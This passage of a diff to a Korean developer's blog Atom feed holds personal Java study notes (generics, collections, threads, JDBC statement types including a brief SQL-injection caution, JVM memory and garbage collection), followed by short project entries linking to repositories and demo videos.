+  &lt;p&gt;기본 자료형 데이터를 인스턴스화 시키는 작업을 가리켜 Boxing이라고 한다 (오토박싱, 오토언박싱)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-17&quot;&gt;난수생성&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;사실상 컴퓨터에게 난수를 생성하도록 요구하는 것은 사실상 불가능에 가깝다.
+&lt;br /&gt;
+그래서 컴퓨터가 생성하는 난수를 가리켜 “Pseudo-random number”라 하는데, 이는 “가짜 난수”라는 뜻이다.
+&lt;br /&gt;
+그래서 Seed값을 설정한다. Seed값이 같으면 동일한 결과와 순서로 출력한다.
+&lt;br /&gt; System.currentTimeMille()같이 유닉스타임 값을 씨드로 많이 사용한다. (default도 이렇게 되있음)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-18&quot;&gt;제네릭&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt; 제네릭은 “일반화”한다는 뜻을 담고 있다. 그리고 그 일반화의 대상은 자료형이다
+ Object를 써도 되잖아?
+      컴파일 과정에서 발견되는 오류를 검출할 수 있다
+      자료형에 대한 안전성이 보장된다
+      상황에 따라서 둘 이상의 클래스를 정의할 수 있다
+
+ 정의방법
+      클래스에 대한 제네릭 정의 class&amp;lt;T&amp;gt;
+      메서드에 대한 정의 방법 public &amp;lt;T&amp;gt; void test(T t), public &amp;lt;T, Y&amp;gt; void test(T t, Y y)
+
+ 제네릭 매개변수에 대한 제한조건 : &amp;lt;T extends (Interface or Upperclass)&amp;gt;
+ 제네릭 변수의 와일드카드 선언
+      와일드 카드란 이름 또는 문자열에 제한을 가하지 않음을 명시하는 용도로 사용되는 특별한 기호
+      파일의 이름을 명시하는데 *가 와일드카드로 사용되었다.
+      이렇듯 자바는클래스의 이름을 명시하는데 있어서 와일드카드로 사용되는 기호 ?를 정의하고 있다. 
+      그리고 이를 기반으로 다음과 같이 변수 또는 매개변수가 선언될 수 있도록 하고 있다
+      FroutBox&amp;lt;? extends Fruit&amp;gt; box1 = new FruitBox&amp;lt;Fruit&amp;gt;();
+      이것은 매개변수에 제네릭객체를 선언함에 있어 유용하다.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;collection&quot;&gt;자바 Collection&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt; 컬렌션 프레임워크의 인터페이스 구조
+      Collection&amp;lt;E&amp;gt; : iterable 인터페이스를 상속한다. iterator라는 이름의 메소드가 정의되어 있다 : “컬렉션 클래스의 종류에 상관없이 동일한 형태의 데이터 참조방식을 유지한다” : 오름차순을 보장
+           Set&amp;lt;E&amp;gt;
+           List&amp;lt;E&amp;gt;
+           Queue&amp;lt;E&amp;gt;
+           Map&amp;lt;K, V&amp;gt;
+
+
+ List
+      : 동일한 인스턴스의 중복 저장을 허용한다.
+      : 인스턴스의 저장 순서가 유지된다
+      ArrayList (배열과 비슷, 하지만 자동용량 증가 등의 편이성)
+           저장소의 용량을 늘리는 과정에서 많은 시간이 소요된다 (선형자료구조)
+           데이터의 삭제에 필요한 연산과정이 매우 길다 (뒤에 저장된 데이터들을 한 칸씩 앞으로 이동)
+           데이터의 참조가 용이해서 빠른 참조가 가능하다
+      LinkedList (비선형 자료구조)
+           저장소의 용량을 늘리는 과정이 간단하다
+           데이터의 삭제가 매우 간단하다
+           데이터의 참조가 다소 불편하다
+
+ Set&amp;lt;E&amp;gt; : 수학에서 말하는 “집합”의 특성을 가진다
+      : List&amp;lt;E&amp;gt;를 구현하는 클래스들과 달리 Set&amp;lt;E&amp;gt;를 구현하는 클래스들은 데이터의 저장순서를 유지하지 않는다.
+      : List&amp;lt;E&amp;gt;를 구현하는 클래스들과 달리 Set&amp;lt;E&amp;gt;를 구현하는 클래스들은 데이터의 중복저장을 허용하지 않는다
+      HashSet&amp;lt;E&amp;gt;
+           객체를 담을때에는 동등비교를 equals 메소드의 호출결과와 hashCode 메소드의 호출결과를 가지고 한다
+           매우 빠른 검색속도 -&amp;gt; 매우 빠른 저장속도
+      TreeSet&amp;lt;E&amp;gt;
+           트리 자료구조를 기반으로 구현되어 있는데, “트리”는 데이터를 정렬된 상태로 저장하는 자료구조이다.
+           따라서 이를 기반으로 구현된 TreeSet&amp;lt;E&amp;gt; 클래스 역시 데이터를 정렬된 상태로 유지한다
+           객체의 경우, Comparable 을 구현해야지 자료구조를 이용할 수 있다
+
+ Map&amp;lt;K, V&amp;gt;
+      HashMap&amp;lt;K, V&amp;gt;
+           Hash 알고리즘 사용, 매우 빠른 검색속도
+           value에 상관없이 중복된 Key의 저장은 불가능하다
+           value는 같더라도 key가 다르면 둘 이상의 데이터 저장도 가능하다
+      TreeMap&amp;lt;K, V&amp;gt;
+           NavigableSet set = treeMap.navigableKeySet();
+           set.iterator() : 오름차순
+           set.descendingIterator() : 내림차순
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-19&quot;&gt;자바의 쓰레드 생성법&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt; Thread를 상속
+ Runnable Interface 구현
+
+ 동기화
+      Synchronized 키워드
+      동기화 메서드보다 동기화 블록이 효율적이다.
+           다중 Synchronized 메서드의 경우? 동기화의 의미가 퇴색될 수 있다. 이럴경우 블록이 효과적.
+           관계없는 코드까지 동기화할필요가 없다
+
+ 실행순서의 동기화
+      Object 클래스에 정의된 메서드를 이용
+           NewsReader 사용자 스레드는 getTodayNews() 메서드를 선언,
+           오늘뉴스가 도착했는지 확인해서 false면 wait()한다.
+           NewPapaer에서 setTodayNews 메서드를 호출, 메서드안에서 notifyAll() 호출
+
+           하단의 메서드들은 민감한 메서드들이므로 모두 동기화 블록처리해서 실행한다
+           wait() // 기다린다
+           notify() // 하나의 쓰레드만 깨운다
+           notifyAll() //모든 스레드를 깨운다.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;jdbc-api1-statement&quot;&gt;JDBC API_1. Statement&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;정적 SQL 문을 실행 해, 작성된 결과를 돌려주기 위해 사용하는 객체이다. 
+&lt;br /&gt;
+기본적으로, Statement 객체 당 하나의 ResultSet 객체가 동시에 열릴 수 있다(사용될 수 있다). 
+&lt;br /&gt;
+그러므로 하나의 ResultSet 오브젝트의 읽기가 다른 read에 의해 끼어 들어지면, 
+&lt;br /&gt;
+각각은 다른 Statement 객체에 의해 생성되어 있어야 한다.
+&lt;br /&gt;
+만약 열려있는(사용중인) Statement의 ResultSet이 있다면 암시적으로 닫힐 수 있다 
+&lt;br /&gt;
+(이 말은 ResultSet을 닫으면 Statement객체 또한 암시적으로 자원해제 될 수 있다는 의미인것 같다)
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;em&gt;생각정리 : Statement 객체는 Escape의 기능이없다. 매 요청마다 새로운 Query를 만들어서 실행하는 방식인것이고,&lt;/em&gt;
+&lt;br /&gt;
+&lt;em&gt;매번 동적으로 바뀌는 부분을 “select 데이터 from table where id =”+숫자와 같이 스트링을 더하는 형태로&lt;/em&gt;
+&lt;br /&gt;
+&lt;em&gt;만들 수 밖에 없다. 이렇게 생성되는 쿼리는 매 요청마다 새로 만들어지는 것이다&lt;/em&gt;
+&lt;br /&gt;
+&lt;em&gt;또한 Statement 방식은 유저의 입력 String을 그대로 사용하는 경우가 많으므로 SQL Injection의 위험이 있으므로 사용하지 않는게 좋다&lt;/em&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+다음은 API에 정의된 원문 내용이다
+&lt;br /&gt;
+&lt;br /&gt;
+public interface Statement extends Wrapper, AutoCloseable
+&lt;br /&gt;
+The object used for executing a static SQL statement and returning the results it produces.
+&lt;br /&gt;
+By default, only one ResultSet object per Statement object can be open at the same time. Therefore, if the reading of one ResultSet object is interleaved with the reading of another, each must have been generated by different Statement objects. All execution methods in the Statement interface implicitly close a statment’s current ResultSet object if an open one exists.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;jdbc-api2-preparedstatement&quot;&gt;JDBC API_2. PreparedStatement&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;프리 컴파일 된 SQL 문을 나타내는 객체이다.
+&lt;br /&gt;
+SQL 문은 프리 컴파일 해, PreparedStatement 객체에 저장된다. 
+&lt;br /&gt;
+문장을 여러 차례 효율적으로 실행하기 위해 사용될 수있다.
+&lt;br /&gt;
+&lt;br /&gt;
+다음은 API에 정의된 원문 내용이다 
+&lt;br /&gt;
+&lt;br /&gt;
+public interface PreparedStatement extends Statement
+&lt;br /&gt;
+An object that represents a precompiled SQL statement.
+&lt;br /&gt;
+A SQL statement is precompiled and stored in a PreparedStatement object. 
+&lt;br /&gt;This object can then be used to efficiently execute this statement multiple times.
+&lt;br /&gt;
+&lt;br /&gt;
+Note: The setter methods (setShort, setString, and so on) for setting IN parameter values must specify types that are compatible with the defined SQL type of the input parameter. 
+&lt;br /&gt;
+For instance, if the IN parameter has SQL type INTEGER, then the method setInt should be used.
+&lt;br /&gt;
+&lt;br /&gt;
+If arbitrary parameter type conversions are required, the method setObject should be used with a target SQL type.
+&lt;br /&gt;
+&lt;br /&gt;
+In the following example of setting a parameter, con represents an active connection:
+&lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;PreparedStatement pstmt 
+  = con.prepareStatement(&quot;UPDATE EMPLOYEES SET SALARY = ? WHERE ID = ?&quot;);
+pstmt.setBigDecimal(1, 153833.00)
+pstmt.setInt(2, 110592)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;jdbc-api3-callablestatement&quot;&gt;JDBC API_3. CallableStatement&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;스토어드 프로시저 SQL을 실행하기 위한 인터페이스.
+&lt;br /&gt;
+일반적인 RDBMS을 호출하는 방식과 동일하게 escape 문법을 사용할 수 있다.
+&lt;br /&gt;
+프로시저 호출결과에 대한 결과값을 가져오기 위해서는 OUT Parameter로 result Parameter를 설정해야 한다. 
+&lt;br /&gt; 일반적인 파라미터는 IN, OUT Parameter를 구분없이 사용할 수 있다.
+첫번째 파라미터는 1로 설정된다
+&lt;br /&gt;
+&lt;br /&gt;
+다음은 API에 정의된 원문 내용이다
+&lt;br /&gt;
+&lt;br /&gt;
+public interface CallableStatement
+extends PreparedStatement
+&lt;br /&gt;
+The interface used to execute SQL stored procedures. The JDBC API provides a stored procedure SQL escape syntax that allows stored procedures to be called in a standard way for all RDBMSs. This escape syntax has one form that includes a result parameter and one that does not. If used, the result parameter must be registered as an OUT parameter. The other parameters can be used for input, output or both. Parameters are referred to sequentially, by number, with the first parameter being 1.
+&lt;br /&gt;
+   {?= call &lt;procedure-name&gt;[(&lt;arg1&gt;,&lt;arg2&gt;, ...)]}
+&lt;br /&gt;
+   {call &lt;procedure-name&gt;[(&lt;arg1&gt;,&lt;arg2&gt;, ...)]}
+IN parameter values are set using the set methods inherited from PreparedStatement. The type of all OUT parameters must be registered prior to executing the stored procedure; their values are retrieved after execution via the get methods provided here.
+&lt;br /&gt;
+&lt;br /&gt;
+A CallableStatement can return one ResultSet object or multiple ResultSet objects. Multiple ResultSet objects are handled using operations inherited from Statement.
+&lt;br /&gt;
+&lt;br /&gt;
+For maximum portability, a call&#39;s ResultSet objects and update counts should be processed prior to getting the values of output parameters.&lt;/arg2&gt;&lt;/arg1&gt;&lt;/procedure-name&gt;&lt;/arg2&gt;&lt;/arg1&gt;&lt;/procedure-name&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;jvm&quot;&gt;JVM&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Reference : http://stophyun.tistory.com/37
+&lt;br /&gt;
+Reference : http://huelet.tistory.com/entry/JVM-메모리구조
+&lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;jvm--&quot;&gt;왜 JVM을 이해해야 하는가?&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;정보시스템의 설계 및 개발단계의 오류로 인한 성능 저하 문제가 약 33% (설계오류, 아키텍처 오류, 어플리케이션  코드 오류)를 차지하고 있으며 특히, 설계 또는 아키텍처의 오류는 개선에 따르는 비용과 시간이 타 부분에 비하여 막대하므로 정보시스템 구축 시 프로젝트 전 단계에 걸쳐 지속적으로 성능관리를 수행하고 그 결과를 검증하는 것이 중요하다.
+&lt;br /&gt;
+같은 기능의 프로그램이더라도 메모리 관리에 따라 성능이 다르게 나타난다
+&lt;br /&gt;
+속도저하 현상이나 예기치않은 에러 현상 등을 방지
+&lt;br /&gt;
+한정된 메모리를 효율적으로 사용하여 최고의 성능을 제공
+&lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;jvm---&quot;&gt;JVM 정의 및 특징&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;자바 가상 머신 (JVM; Java Virtual Machine)은 우리가 작성한 Java 프로그램, WAS (;Web Application Server) 등을 구별하지 않고 Java 프로그램의 범주에 들어가는 모든 것들을 실행시키는 역할을 한다.
+&lt;br /&gt;
+JVM은 정의된 Specification을 구현한 하나의 독자적인 Runtime Instance라고 할 수 있다.
+&lt;br /&gt;
+&lt;br /&gt;
+특징1. 스택기반의 가상머신
+&lt;br /&gt;
+특징2. 가비지 컬렉션
+&lt;br /&gt;
+특징3. 플랫폼에 독립적&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;jvm---1&quot;&gt;JVM의 기본적인 수행과정&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Java Source(.java) - Java Compiler - Java Byte Code(.class) - JVM
+&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;b&gt;JVM 구성&lt;/b&gt;&lt;/p&gt;
+
+  &lt;blockquote&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Class Loader&lt;/li&gt;
+      &lt;li&gt;Runtime Data Areas&lt;/li&gt;
+      &lt;li&gt;Execution Engine&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/blockquote&gt;
+
+  &lt;ol&gt;
+    &lt;li&gt;Class Loader System을 통해 Class 파일들을 JVM으로 로딩한다
+&lt;br /&gt;&lt;/li&gt;
+    &lt;li&gt;로딩된 Class 파일들은 Execution Engine을 통해 해석된다
+&lt;br /&gt;&lt;/li&gt;
+    &lt;li&gt;해석된 프로그램은 Runtime Data Areas에 배치되어 실질적인 수행이 이루어지게 된다. 
+&lt;br /&gt;
+이러한 실행 과정 속에서 JVM은 필요에 따라 Thread Synchronization과 Garbage Collection 같은 관리작업을 수행하게 된다&lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;hr /&gt;
+  &lt;p&gt;&lt;b&gt;Class Loader&lt;/b&gt;&lt;/p&gt;
+
+  &lt;blockquote&gt;
+    &lt;p&gt;&lt;em&gt;JVM 안으로 Class를 Load하고 Link를 통해 적절히 배치하는 일력의 작업을 수행하는 모듈. Runtime시에 동적으로 Class를 Load함&lt;/em&gt;
+&lt;br /&gt;&lt;/p&gt;
+  &lt;/blockquote&gt;
+
+  &lt;p&gt;&lt;b&gt;Execution Engine&lt;/b&gt;&lt;/p&gt;
+
+  &lt;blockquote&gt;
+    &lt;p&gt;&lt;em&gt;클래스 로더를 통해 JVM 내의 런타임 데이터 영역에 배치된 바이트코드는 실행 엔진에 의해 실행된다. 실행엔진은 자바 바이트코드를 명령어 단위로 읽어서 실행한다&lt;/em&gt;&lt;/p&gt;
+  &lt;/blockquote&gt;
+
+  &lt;p&gt;&lt;b&gt;Runtime Data Area&lt;/b&gt;&lt;/p&gt;
+
+  &lt;blockquote&gt;
+    &lt;p&gt;&lt;em&gt;JVM이라는 프로그램이 운영체제 위에서 실행되면서 할당받는 메모리 영역이다. 런타임 데이터 영역은 5개의 영역으로 나눌 수 있다&lt;/em&gt;&lt;/p&gt;
+  &lt;/blockquote&gt;
+
+  &lt;blockquote&gt;
+    &lt;p&gt;&lt;b&gt;1.Class Area (클래스)&lt;/b&gt;&lt;/p&gt;
+
+    &lt;blockquote&gt;
+      &lt;p&gt;&lt;em&gt;Method Area, Code Area, Static Area로 불리어진다&lt;/em&gt;
+&lt;br /&gt;
+&lt;em&gt;모든 스레드가 공유되는 영역으로 JVM이 시작될 때 생성된다&lt;/em&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;em&gt;&lt;b&gt;1-1. Field Information&lt;/b&gt; : 멤버변수의 이름, 데이터 타입, 접근 제어자에 대한 정보&lt;/em&gt;
+&lt;br /&gt;
+&lt;em&gt;&lt;b&gt;1-2. Method Information&lt;/b&gt; : 메서드의 이름, 리턴타입, 매개변수, 접근 제어자에 대한 정보&lt;/em&gt;
+&lt;br /&gt;
+&lt;em&gt;&lt;b&gt;1-3. Type Information&lt;/b&gt; : Type 속성이 Class인지 Interface인지의 여부저장&lt;/em&gt;
+&lt;br /&gt;
+- Type의 전체이름 (패키지명 + 클래스명)
+&lt;br /&gt;
+- Type의 Super Class의 전체이름
+&lt;br /&gt;
+- 접근 제어자 및 연관된 interface의 전체 리스트 저장
+&lt;br /&gt;
+&lt;em&gt;&lt;b&gt;1-4. Constant Pool&lt;/b&gt;&lt;/em&gt;
+&lt;br /&gt;
+- Type에서 사용된 상수를 저장하는 곳(중복이 있을 시 기존상수 사용)
+&lt;br /&gt;
+- Type에서 사용된 상수를 저장하는 곳(중복이 있을 시 기존상수 사용)
+&lt;br /&gt;
+&lt;em&gt;&lt;b&gt;1-5.Class Variable&lt;/b&gt; : 모든 객체가 공유할 수 있고, 객체 생성없이 접근 가능&lt;/em&gt; &lt;/p&gt;
+    &lt;/blockquote&gt;
+
+    &lt;p&gt;&lt;b&gt;2.Stack Area (스택)&lt;/b&gt;&lt;/p&gt;
+
+    &lt;blockquote&gt;
+      &lt;p&gt;&lt;em&gt;- JVM 스택은 각 스레드마다 하나씩 존재하며 스레드가 시작될 때 생성된다. 스택 프레임(Stack Frame)이라는 구조체를 저장하는 스택으로, JVM 스택에 스택 프레임을 추가하고(push) 제거하는(pop) 동작만 수행한다&lt;/em&gt;
+&lt;br /&gt;
+&lt;em&gt;- 메서드 안에서 사용되어지는 값들 저장, 호출된 메서드의 매개변수, 지역변수, 리턴 값 및 연산 시 일어나는 값들을 임시로 저장&lt;/em&gt;
+&lt;br /&gt;
+&lt;em&gt;- 메서드 수행이 끝나면 프레임별로 삭제&lt;/em&gt;&lt;/p&gt;
+    &lt;/blockquote&gt;
+
+    &lt;p&gt;&lt;b&gt;3.Heap Area (힙)&lt;/b&gt;&lt;/p&gt;
+
+    &lt;blockquote&gt;
+      &lt;p&gt;&lt;em&gt;new 연산자로 생성된 객체와 배열을 저장하는 공간&lt;/em&gt;&lt;/p&gt;
+
+      &lt;p&gt;&lt;em&gt;클래스 영역에 로드된 클래스만 생성가능&lt;/em&gt;&lt;/p&gt;
+
+      &lt;p&gt;&lt;em&gt;Garbage Collector를 통해 메모리 반환&lt;/em&gt;
+&lt;em&gt;JVM 성능 등의 이슈에서 가장 많이 언급되는 공간이다&lt;/em&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;em&gt;&lt;b&gt;3-1. Permanent Generation&lt;/b&gt; : 생성된 객체들의 정보의 주소 값이 저장된 공간&lt;/em&gt;
+&lt;br /&gt;
+&lt;em&gt;&lt;b&gt;3-2. Young Generation (New Area)&lt;/b&gt;&lt;/em&gt;
+&lt;br /&gt;
+- Eden : 객체들이 최초로 생성되는 공간
+&lt;br /&gt;
+- Survivor : Eden에서 참조되는 객체들이 저장되는 공간
+&lt;br /&gt;
+&lt;em&gt;&lt;b&gt;3-3. Old Generationr (Old Area)&lt;/b&gt; : New Area에서 일정시간 이상 참조되고 있는 객체들이 저장되는 공간&lt;/em&gt;&lt;/p&gt;
+    &lt;/blockquote&gt;
+
+    &lt;p&gt;&lt;b&gt;4.Native Method Stack Area (네이티브 메서드)&lt;/b&gt;&lt;/p&gt;
+
+    &lt;blockquote&gt;
+      &lt;ul&gt;
+        &lt;li&gt;
+          &lt;p&gt;자바 외에 다른 언어에서 제공되는 메서드들이 저장되는 공간&lt;/p&gt;
+        &lt;/li&gt;
+        &lt;li&gt;
+          &lt;p&gt;Java 외의 언어로 작성된 프로그램, API 툴킷 등과의 통합을 쉽게 하기 위하여 JNI (Java Native Interface)라는 표준 규약을 제공, 다시 말해 Native Code로 되어 있는 Function의 호출을 Java 프로그램 내에서 직접 수행할 수도 있고 그 결과 값을 받아 올 수도 있게 된 것이다.&lt;/p&gt;
+        &lt;/li&gt;
+      &lt;/ul&gt;
+    &lt;/blockquote&gt;
+
+    &lt;p&gt;&lt;b&gt;5.PC Register (PC 레지스터)&lt;/b&gt;&lt;/p&gt;
+
+    &lt;blockquote&gt;
+      &lt;p&gt;Thread가 만들어질 때마다 생성되는 공간&lt;/p&gt;
+
+      &lt;p&gt;Thread가 어떤 부분을 어떤 명령으로 실행할 지에 대한 기록&lt;/p&gt;
+
+      &lt;p&gt;현재 실행되는 부분의 명령과 주소를 저장&lt;/p&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;garbage-collection&quot;&gt;Garbage Collection&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;참조되지 않은 객체들을 탐색 후 삭제
+&lt;br /&gt;
+삭제된 객체의 메모리를 반환
+&lt;br /&gt;
+Heap 메모리의 재사용&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;Minor Garbage Collection&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;New 영역에서 일어나는 Garbage Collection&lt;/li&gt;
+      &lt;li&gt;Eden 영역에 객체가 가득차게 되면 첫번째 Garbage Collection 발생&lt;/li&gt;
+      &lt;li&gt;Survivor1 영역에 값 복사&lt;/li&gt;
+      &lt;li&gt;Survivor1 영역을 제외한 나머지 영역의 객체들을 삭제&lt;/li&gt;
+      &lt;li&gt;Eden 영역과 Survivor1 영역의 메모리가 기준치 이상일 경우, Eden 영역에 생성된 객체와 Survivor1 영역에 있는 객체 중 참조되고 있는 객체가 있는지 검사&lt;/li&gt;
+      &lt;li&gt;Survivor2 영역을 제외한 영역의 객체들을 삭제&lt;/li&gt;
+      &lt;li&gt;반복&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;Major Garbage Collection (Full Garbage Collection, Stop the world)&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Old 영역에 있는 모든 객체들을 검사&lt;/li&gt;
+      &lt;li&gt;참조되지 않은 객체들을 한꺼번에 삭제&lt;/li&gt;
+      &lt;li&gt;Minor Garbage Collection에 비해 시간이 오래 걸리고 실행 중 프로세스가 정지&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2015/08/19/정리시작</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2015/08/19/%EC%A0%95%EB%A6%AC%EC%8B%9C%EC%9E%91.html"/>
+        <title>이사시작</title>
+        <updated>2015-08-19T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2015/08/19/%EC%A0%95%EB%A6%AC%EC%8B%9C%EC%9E%91.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;스스로에 대해 크게 깨달은바가 있어서
+&lt;br /&gt;
+지금까지 공부했던 내용이나 미쳐 알지못한 개념에 대한 정리를 시작합니다.
+&lt;br /&gt;
+부족한 부분은 새로 만들고,
+Evernote에 모아둔 내용들은 정제하여 업데이트하기 시작합니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2015/08/10/홈페이지_개설</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2015/08/10/%ED%99%88%ED%8E%98%EC%9D%B4%EC%A7%80_%EA%B0%9C%EC%84%A4.html"/>
+        <title>홈페이지 개설!</title>
+        <updated>2015-08-10T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2015/08/10/%ED%99%88%ED%8E%98%EC%9D%B4%EC%A7%80_%EA%B0%9C%EC%84%A4.html</uri>
+        </author>
+        <content type="html">&lt;p&gt;깃허브 및 정적데이터 관리용 홈페이지.
+개인 홈페이지는 완성 후 공개 예정입니다. ^^&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+  
+      
+  
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2015/03/01/[4]SpringGradleBBS</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2015/03/01/%5B4%5DSpringGradleBBS.html"/>
+        <title>SpringGradleBBS</title>
+        <updated>2015-03-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2015/03/01/%5B4%5DSpringGradleBBS.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;TDD스터디에서 학습을 위해 진행한 연습용 프로젝트입니다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/SpringGradlePractice&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/OKC8iTVMfDA?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2015/01/01/[1]With</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2015/01/01/%5B1%5DWith.html"/>
+        <title>With-Project</title>
+        <updated>2015-01-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2015/01/01/%5B1%5DWith.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;현재 제작중입니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2014/12/01/[9]LibraryPopularityVisualization</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2014/12/01/%5B9%5DLibraryPopularityVisualization.html"/>
+        <title>Opensource Lineup</title>
+        <updated>2014-12-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2014/12/01/%5B9%5DLibraryPopularityVisualization.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;github의 수 많은 오픈소스 Repository들의 인기도를 한번에 볼 수 있는 데이터 시각화를 제공하는 웹서비스&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/LibraryPopularityVisualization&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
+	&amp;lt;iframe src=&quot;http://www.youtube.com/embed/F0Ut4B_lKg4?autoplay=1&quot; class=&quot;video&quot;&amp;gt;&amp;lt;/iframe&amp;gt;	
+&amp;lt;/div&amp;gt;&lt;/p&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2014/11/01/[10]DataVisualization</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2014/11/01/%5B10%5DDataVisualization.html"/>
+        <title>Sound & Light in 판교</title>
+        <updated>2014-11-01T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2014/11/01/%5B10%5DDataVisualization.html</uri>
+        </author>
+        <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;일몰시간에 서로 다른 판교의 7개 장소에서 아두이노 기기를 이용해 Sound, Light 데이터를 30분간 수집하고, 수집한 데이터를 시각화했던 데이터 시각화 수업의 Toy Project 입니다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/YoonSung/DataVisualization_SoundLightData&quot;&gt;소스저장소&lt;/a&gt;
+&amp;lt;div class=&quot;youtube&quot;&amp;gt;
